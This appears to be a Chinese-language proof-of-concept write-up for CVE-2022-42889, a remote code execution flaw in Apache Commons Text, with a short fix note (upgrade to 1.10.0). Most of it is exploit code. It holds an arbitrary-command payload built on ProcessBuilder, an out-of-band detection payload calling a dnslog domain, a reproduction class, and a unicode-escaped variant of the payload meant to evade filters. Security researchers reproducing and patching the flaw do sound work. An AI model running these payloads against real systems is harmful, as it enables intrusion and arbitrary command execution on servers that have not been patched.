# Apache Commons Text 远程代码执行（CVE-2022-42889 ）

## 来源描述：
https://seclists.org/oss-sec/2022/q4/22
CVE-2022-42889：由于不安全的插值默认值，1.10.0 之前的 Apache Commons Text 在应用于不受信任的输入时允许 RCE。

## POC：
### 利用
`String payload = "sssa${script:js:new java.lang.ProcessBuilder(\"任意系统命令\").start()}asdasd";`
### 探测：
`String payload3 = "sssa${url:UTF-8:http://dnslog.fun/CVE-2022-42889.html}asdasd";`

这个漏洞类似于Log4shell，脏数据插入到任何地方，只要进入到stringSubstitutorInterpolator.replaceXXX方法就可触发。

## 影响范围：
Apache Commons Text < 1.10.0【2022.09.28之前所有版本】

## 复现：
```
引入漏洞组件：

<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-text</artifactId>
    <version>1.9</version>
</dependency>
```
## 复现POC类：
```
package org.joychou.controller;
import org.apache.commons.text.StringSubstitutor;

public class SLF {

    public static void main(String[] args)  {
        System.out.println("Welcome to the POC of RCE on Apache Commons Text below 1.10.0");
// 这种用法才存在漏洞
        StringSubstitutor stringSubstitutorInterpolator = StringSubstitutor.createInterpolator();
        String payload = "sssa${script:js:new java.lang.ProcessBuilder(\"/Applications/Calculator.app/Contents/MacOS/Calculator\").start()}asdasd";
//        stringSubstitutorInterpolator.replace(payload); // exploit
//        stringSubstitutorInterpolator.replaceIn(new StringBuffer(payload)); //exploit

        System.out.println("The above payload will start a Calculator hence we can execute any code we want");

    }
}
```

## 修复方式：
-- 升级到1.10.0版本

类似的：
GHSL-2022-017: Arbitrary command execution through Apache Commons Configuration - CVE-2022-33980

https://securitylab.github.com/advisories/GHSL-2022-017_Apache_Commons_Configuration/

## POC

```
        String payload1 = "sssa${script:js:new java.lang.\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072(\"open -a Calculator\".split(\" \")).\\u0073\\u0074\\u0061\\u0072\\u0074()}asdasd";
保持前面部分不变，后面的字符串可以unicode。
```

